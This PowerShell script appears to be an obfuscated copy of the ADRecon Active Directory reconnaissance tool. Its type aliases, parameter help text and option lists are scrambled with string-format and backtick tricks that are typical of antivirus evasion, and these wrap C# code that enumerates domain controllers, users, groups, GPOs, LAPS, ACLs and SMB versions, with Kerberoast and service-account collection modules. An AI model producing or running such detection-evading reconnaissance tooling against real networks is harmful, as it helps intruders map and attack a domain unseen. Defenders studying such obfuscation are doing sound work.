  $eM73 =  [tYPe]("{1}{4}{3}{0}{5}{2}" -F 'web.','SysTE','TTpUtIliTy','.','m','h') ; sEt ('ea9o'+'1')  (  [TYPe]("{2}{0}{1}" -F'm','.gC','SysTe')  ); sEt-Variable  ("1k"+"W") (  [Type]("{5}{2}{9}{1}{3}{0}{8}{6}{4}{10}{7}" -f'el.XlLIsTobj','oFF','cRoS','ICe.INtEROP.EXC','OuRC','MI','Cts','ype','E','OfT.','et'));   $mD5LE = [tYPE]("{9}{4}{6}{7}{2}{3}{10}{5}{1}{8}{0}"-F'esNoGueSS','x','Fice.INtErOp.ex','C','c','.','ROso','fT.oF','lY','Mi','El')  ; sv  ('l0'+'J8')  (  [tyPe]("{1}{10}{6}{11}{8}{7}{9}{0}{5}{4}{3}{2}" -F 'sOuRC','mIc','pe','Y','t','e','osoFT.ofFiCe.INtErop','IvOTTA','ExceL.XLP','bLE','r','.') );    $Yd3l  =  [TYpe]("{3}{5}{2}{13}{6}{11}{7}{8}{0}{12}{1}{4}{14}{10}{9}" -f 'XcE','IV','FIC','mi','otta','cROSoFt.OF','I','E','Rop.E','IonliST','LevErS','NT','L.xlP','e.','B') ;   sEt-iTEm VaRiaBlE:7uWP  ([tyPE]("{8}{13}{2}{1}{4}{5}{3}{15}{14}{7}{0}{12}{10}{6}{11}{9}" -F 'D','oFT.','cROS','TEr','oFFIce.','iN','cuLATi','L','m','N','al','O','C','i','.xlPIvoTfIE','op.EXCeL')  ) ;    sEt-ITem  ('v'+'arIA'+'BLE'+':j'+'kI62')  ( [tYpe]("{3}{1}{0}{9}{10}{2}{7}{8}{4}{5}{6}"-F'OfT.OfF','os','inTErop','MICR','xCEl.','XL','charttype','.','e','I','CE.'));  sEt-vARIaBle w2ivSd ( [Type]("{7}{0}{4}{2}{3}{10}{1}{6}{9}{8}{5}"-F'I','.iNt','OF','T.offiC','crOs','IreCTioN','ERop.eXC','M','.XlD','EL','e')  ) ;  sEt-ITem  ("VARi"+"ABLe"+":"+"25u") (  [tyPE]("{1}{3}{8}{6}{0}{2}{7}{4}{5}" -f 'InterOp.Exc','microSoFT.o','eL.XLR','f','W','cOL','e.','O','FIC')  )  ;   SV  ('0'+'C1X9')  ( [tYPe]("{6}{7}{3}{4}{2}{0}{1}{8}{5}" -F'X','lfOrMATCON','l.','T.oFfIce.INTERop.E','XcE','ype','mICR','oSOF','DiTIONT')) ;    SET-iteM  ('VaRI'+'ABLE:YdS4'+'7') ( [TyPE]("{1}{4}{2}{8}{5}{7}{9}{0}{6}{3}" -F'i','MicrOsoft','FiCE.IntE','oN','.OF','ot','ENTaTI','FiEldo','rOp.EXCEL.xlpIv','r')  );  set-vaRiablE 7tU6 ([Type]("{7}{9}{6}{10}{4}{8}{2}{3}{1}{5}{0}"-F 'R','.','OP','.excel','.in','XLsoRtoRDE','SofT.','M','ter','ICRO','oFfiCE'))  ;  SEt  ('N8tP'+'U') ( [tyPE]("{0}{1}{4}{3}{2}" -f'sy','S','MAgE','eM.dRawING.I','t'))  ;    $Uxzo  =  [typE]("{0}{1}"-f 'm','ATH')  ;    $R5Q= [type]("{0}{1}" -F'a','rrAy') ;   $1sIq3r  =  [Type]("{2}{1}{3}{0}"-F'rter','iTco','b','NvE') ;   $dQIR4=  [tYPE]("{0}{3}{1}{2}" -f'SYs','cOnV','Ert','tEm.');  $LQw7 = [tYpe]("{0}{1}"-F'a','dsi')  ;  sEt-vARIaBLe o0UY (  [TYpE]("{1}{4}{3}{0}{2}"-F 'o','sySteM.','BjECt','CoM','__') )  ;SV ("b2"+"o") (  [tYPE]("{1}{0}{2}"-f'Rin','ST','g') );  sEt-ITeM  VAriabLE:UX5M ( [TyPE]("{8}{6}{5}{3}{7}{0}{4}{2}{1}" -F'I','AIN','TORy.dOm','V','rEc','irectoRYSer','Em.D','iCEs.ACtiveD','sysT'));  $wVlF = [TYPE]("{6}{10}{8}{4}{1}{7}{11}{5}{2}{9}{3}{0}{13}{12}" -F 'R','.','.','O','Ces','rEcTORy','sys','ACtiVEd','RVi','F','tEm.DIrEcTOrYSE','I','St','e') ;  $QRYuk =  [TYpE]("{4}{3}{7}{1}{8}{0}{6}{5}{2}" -F 'Ur','ce','KS','ySTeM.DIrEctoRYSE','S','tYMAs','i','Rvi','s.sec')  ; sET-itEM ('VAriaB'+'l'+'e:u2m') ([Type]("{1}{5}{6}{7}{4}{0}{3}{2}"-F 'REa','s','NG.ThreaD','dI','h','yste','M','.T'))  ;    SET-iTEM VaRIABLE:KseF (  [TyPe]("{1}{2}{0}"-f'tr','in','tp') ) ;  SET ("GF"+"1v") ( [TyPe]("{3}{0}{6}{2}{1}{7}{5}{4}"-f'ys','mE.iNte','uNtI','S','haL','oPsERvicEs.mARS','tEM.r','R')  );  sv  ("1"+"Ti")  (  [TYPE]("{1}{3}{5}{2}{0}{4}" -F'MB','RefLecT','SsE','I','LY','oN.a')); set-IteM variAblE:YfVZn (  [tYPe]("{4}{1}{2}{0}{3}{5}"-F '.bITCoNV','yStE','M','erTe','S','R') ); sv  ASCouG ([typE]("{2}{1}{0}" -f'NvErt','o','C')  ) ;  set-itEm  ("va"+"RiAbl"+"E:9b5p6")  (  [TypE]("{4}{1}{3}{0}{2}" -f 'ADwsCLA','Eco','sS','N.','AdR') ) ;  $3iDH  =  [TYPe]("{0}{4}{5}{6}{2}{1}{3}"-F 'Sy','Top','S','wATch','StEM.diaGNo','stIcs','.')  ;  $OlXE  = [typE]("{0}{4}{2}{1}{3}"-F 'a','.l','EcoN','dAPCLAss','Dr') ;  set ('RW'+'k') ([tYPE]("{0}{1}{2}" -F'pSobj','E','CT')  );   $b7iFnJ= [TypE]("{2}{3}{0}{5}{1}{4}"-f '.rEfLEc','ioN.A','Sy','sTeM','SsEMblY','t')  ;   $CLf0n  = [tyPe]("{1}{3}{4}{0}{2}{5}" -F'ToMATio','manAgeMENt','n.pScrE','.a','U','dENTiAl') ; $aBOz  = [tYpE]("{1}{0}{3}{2}" -F'nVi','E','EnT','roNM'); 

[CmdletBinding()]
param
(
    [Parameter(mAnDAtory = ${f`ALse}, heLpmESsAgE = {("{2}{3}{10}{5}{11}{4}{6}{8}{0}{9}{1}{7}" -f 'lt),','LD','Whi','ch m',' ',' to ','AD','AP','WS (defau',' ','ethod','use;')})]
    [ValidateSet({"{0}{1}" -f'ADW','S'}, {"{1}{0}"-f 'P','LDA'})]
    [string] ${mET`HoD} = ("{1}{0}" -f'S','ADW'),

    [Parameter(MandatoRy = ${fal`SE}, HeLpMeSSaGE = {"{2}{3}{7}{1}{0}{6}{4}{5}" -f 'r IP','rolle','Dom','ain ',' Do','main FQDN.',' Address or','Cont'})]
    [string] ${do`mainc`o`NTrOll`ER} = '',

    [Parameter(MANdAtORY = ${Fa`l`se}, hELPmESSAge = {"{1}{0}{2}{3}"-f 'omain Cr','D','edenti','als.'})]
    [Management.Automation.PSCredential] ${C`ReDeNT`IAL} =  ( DiR ('v'+'ARIAb'+'lE:cLF0N')).VAlue::"em`PTy",

    [Parameter(mANDAtoRy = ${fa`l`Se}, helpmesSAGe = {"{16}{28}{7}{18}{40}{44}{0}{32}{37}{26}{10}{41}{9}{8}{17}{1}{33}{39}{5}{43}{31}{20}{14}{35}{21}{3}{25}{6}{42}{4}{24}{11}{45}{38}{13}{22}{15}{23}{12}{34}{36}{19}{2}{29}{30}{27}"-f 't',' A',' the','generat','DRe','Repor','h',' for ADReco','n','to ge',' CSV file','on-Re','l is no','when Mi','. Use ','soft','Pa','erate the','n output ','d on','lsx',' to ','cro',' Exce','c','e t','g the','d to run ADRecon.','th',' ','host use','x','ain','DRecon','t i','it','nstalle','in',' ','-','fol','s ','e A','t.','der con','port.xlsx'})]
    [string] ${gENEX`c`el},

    [Parameter(MAndaToRy = ${F`ALSe}, HelPMesSage = {(("{34}{15}{19}{25}{11}{23}{1}{3}{7}{18}{17}{5}{2}{30}{35}{10}{6}{27}{4}{9}{32}{26}{12}{16}{20}{28}{8}{13}{29}{14}{31}{24}{21}{22}{0}{33}" -f'x','con output','e ',' f',' files','v','M','old','d',' an','XML/JSON/HT','r',' ADRecon-Report.xlsx. (',' will',' created ','ath','The folde','sa','er to ',' f','r ','doesnzk7t ','e',' ADRe',' ','o','he','L','specifie',' be','the','if it','d t','ist)','P',' CSV/'))."Re`Pl`ACe"('zk7',[strING][chAr]39)})]
    [string] ${oUt`pU`T`Dir},

    [Parameter(MANDatory = ${f`ALSe}, helPMESsaGe = {("{14}{50}{21}{66}{76}{46}{53}{86}{32}{74}{62}{73}{48}{67}{31}{59}{58}{63}{80}{36}{26}{70}{47}{68}{72}{8}{43}{82}{13}{11}{69}{64}{33}{41}{23}{24}{28}{77}{22}{34}{56}{49}{5}{52}{12}{18}{0}{35}{87}{78}{25}{20}{57}{40}{65}{42}{45}{81}{19}{17}{61}{15}{84}{1}{88}{4}{29}{39}{2}{90}{9}{89}{30}{55}{3}{27}{37}{60}{7}{38}{16}{51}{44}{83}{79}{6}{71}{54}{10}{75}{85}" -f'omainCo','M',' G','Rec','mbe','d','CLs,','rs, Computers','ude:','NSZo','t, Kerberoast, DomainA',' T','olic',',','Wh','Change',' ','ps, Grou','y, D','Grou',' UserSPNs, P','omma sep','ordPolicy, Fi','hem','aHistory, Pa','s,','ogo','ords,','s','rs, OUs','es, D','o','efau','ite','neGra','ntrol','viceL',' Pr',',',',','dAttr','s, Subnets, Sc','bute',' Forest, D','A','s','Domain','value','CLs, Kerbero','asswor','ich modules to run; C','ComputerSPNs, L','P',' ','por','NS','inedP','asswor','ts','un','inte','p',' all except','use',', S','i','arated; e.','ast and DomainAcc','s inc','rusts','n) Valid ',' GPORe','l',' A','lt','ccountsusedforS','g Forest,','sw','ers, User',', A','dforSer',', ','omain','PS, BitLocker','s, Group','erviceLogon','(D','l','e','n','POs, gPLinks, D')})]
    [ValidateSet({"{1}{0}{2}" -f 'or','F','est'}, {"{0}{1}"-f'Doma','in'}, {"{2}{0}{1}"-f'st','s','Tru'}, {"{0}{1}" -f'Sit','es'}, {"{1}{2}{0}"-f 'ts','S','ubne'}, {"{2}{0}{3}{1}"-f 'chemaHist','ry','S','o'}, {"{2}{3}{0}{1}"-f 'lic','y','PasswordP','o'}, {"{5}{1}{4}{2}{0}{6}{3}"-f 'd','i','eGrainedPasswor','y','n','F','Polic'}, {"{1}{0}{2}{3}"-f 'Co','Domain','ntrol','lers'}, {"{1}{0}"-f 'sers','U'}, {"{1}{0}"-f'Ns','UserSP'}, {"{3}{2}{4}{5}{0}{1}"-f'i','butes','w','Pass','ord','Attr'}, {"{1}{0}" -f 'oups','Gr'}, {"{2}{1}{0}{3}"-f'p','u','Gro','Changes'}, {"{1}{2}{0}"-f'pMembers','Gro','u'}, 'OUs', {"{0}{1}" -f'G','POs'}, {"{1}{0}{2}"-f 'in','gPL','ks'}, {"{2}{1}{0}"-f 'nes','o','DNSZ'}, {"{2}{1}{0}" -f 'ds','cor','DNSRe'}, {"{0}{2}{1}"-f'P','s','rinter'}, {"{1}{0}{2}" -f 'u','Comp','ters'}, {"{0}{2}{1}"-f 'ComputerSP','s','N'}, {"{0}{1}" -f'LA','PS'}, {"{0}{2}{1}" -f 'Bi','Locker','t'}, {"{1}{0}" -f 'CLs','A'}, {"{1}{2}{0}" -f'rt','GP','ORepo'}, {"{1}{2}{0}" -f'rberoast','K','e'}, {"{2}{6}{3}{4}{1}{5}{0}{7}"-f 'Logo','vi','DomainAccountsu','rSe','r','ce','sedfo','n'}, {"{2}{1}{0}" -f'ult','efa','D'})]
    [array] ${C`ol`LECt} = ("{0}{1}" -f 'D','efault'),

    [Parameter(MaNdatoRy = ${f`AlSE}, heLpmESsAge = {("{10}{18}{3}{4}{15}{11}{16}{13}{31}{19}{17}{1}{32}{20}{9}{24}{34}{35}{14}{30}{7}{28}{0}{8}{2}{6}{29}{25}{26}{33}{27}{23}{21}{5}{22}{12}" -f'DOUT','e.g STDOUT,','h -',';',' ',' and Ex','Co','faul',' wit','SON,','Output ty','o',')','a','e','C','mm',' ','pe','eperated;',',XML,J','SV','cel','C','HTML,','ct p','ar','e ','t ST','lle','l (De',' s','CSV','ameter, els','Ex','c')})]
    [ValidateSet({"{0}{1}" -f 'STD','OUT'}, 'CSV', 'XML', {"{1}{0}"-f 'ON','JS'}, {"{0}{1}" -f'EXCE','L'}, {"{1}{0}" -f 'L','HTM'}, 'All', {"{1}{0}"-f't','Defaul'})]
    [array] ${OUt`PU`TTY`pe} = {"{0}{1}"-f'Def','ault'},

    [Parameter(MAnDAtory = ${fAl`se}, hElPMeSsAgE = {"{7}{3}{12}{9}{0}{5}{8}{1}{2}{11}{6}{10}{4}" -f 'nt','ts. D','efaul','Dor','ys',' accou','90 d','Timespan for ','n','a','a','t ','m'})]
    [ValidateRange(1,1000)]
    [int] ${D`o`RmAN`TTim`EspAn} = 90,

    [Parameter(mandAtORY = ${Fa`lSe}, helPMesSAgE = {"{0}{6}{11}{7}{9}{2}{1}{10}{4}{3}{8}{5}" -f'Maximum','t ','un','e. ','ag','ays',' mac','ine','Default 30 d',' acco','password ','h'})]
    [ValidateRange(1,1000)]
    [int] ${PAs`Sma`xa`ge} = 30,

    [Parameter(MANDATory = ${fA`lse}, HelpmeSsaGE = {"{5}{7}{0}{3}{9}{4}{8}{2}{1}{11}{10}{6}" -f'e','cher ob','or the LDAP sear','Size to','t ','The P','0','ag','f',' se','ult 20','ject. Defa'})]
    [ValidateRange(1,10000)]
    [int] ${pAGES`i`Ze} = 200,

    [Parameter(mandAtORy = ${F`Al`SE}, helPmESsage = {"{4}{14}{5}{1}{16}{17}{8}{2}{18}{12}{0}{13}{11}{7}{9}{3}{10}{15}{6}" -f 'sin','f t','ring pro',' D','The ','mber o','0','o','u','f objects.','efaul',' ','es','g','nu','t 1','hr','eads to use d','c'})]
    [ValidateRange(1,100)]
    [int] ${THre`A`dS} = 10,

    [Parameter(mAnDATory = ${f`AL`SE}, HElPmeSsAge = {'O'+'nly '+'co'+'llect'+' '+'de'+'tails'+' '+'f'+'or '+'e'+'n'+'abled '+'ob'+'ject'+'s'+'. '+'D'+'e'+'fault '+"`$false"})]
    [bool] ${ONL`YENa`BL`ed} = ${fAL`SE},

    [Parameter(mANDatOrY = ${F`AL`sE}, heLpMesSagE = {"{0}{12}{3}{4}{8}{11}{1}{6}{7}{9}{2}{10}{5}" -f'Cr','s','rt-Tran',' AD','R','cript.','in','g','e',' Sta','s','con Log u','eate'})]
    [switch] ${L`OG},

    [Parameter(MAndAToRY = ${FA`LSE}, helpmeSsagE = {"{5}{8}{6}{4}{7}{2}{3}{9}{10}{1}{0}"-f'con','ADRe','h','e excel file',' use in','Which','o to',' t',' Log','? Defaul','t '})]
    [ValidateSet({"{1}{0}"-f 'DRecon','A'}, {"{1}{0}"-f 'rCX','Cybe'}, {"{1}{0}" -f 'atu','Pay'})]
    [string] ${lo`gO} = ("{0}{1}" -f 'AD','Recon')
)

${Ad`ws`sourCe} = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Threading;
using System.DirectoryServices;
//using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
//using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdDC = (PSObject) record;
                    bool Infra = false;
                    bool Naming = false;
                    bool Schema = false;
                    bool RID = false;
                    bool PDC = false;
                    PSObject DCSMBObj = new PSObject();

                    string OperatingSystem = CleanString((AdDC.Members["OperatingSystem"].Value != null ? AdDC.Members["OperatingSystem"].Value : "-") + " " + AdDC.Members["OperatingSystemHotfix"].Value + " " + AdDC.Members["OperatingSystemServicePack"].Value + " " + AdDC.Members["OperatingSystemVersion"].Value);

                    foreach (var OperationMasterRole in (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdDC.Members["OperationMasterRoles"].Value)
                    {
                        switch (OperationMasterRole.ToString())
                        {
                            case "InfrastructureMaster":
                            Infra = true;
                            break;
                            case "DomainNamingMaster":
                            Naming = true;
                            break;
                            case "SchemaMaster":
                            Schema = true;
                            break;
                            case "RIDMaster":
                            RID = true;
                            break;
                            case "PDCEmulator":
                            PDC = true;
                            break;
                        }
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", AdDC.Members["Domain"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Site", AdDC.Members["Site"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Name", AdDC.Members["Name"].Value));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.Members["IPv4Address"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Members["HostName"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.Members["IPv4Address"].Value != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.Members["IPv4Address"].Value);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSchema = (PSObject) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Members["ObjectClass"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Members["Name"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Members["whenCreated"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Members["whenChanged"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Members["DistinguishedName"].Value));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
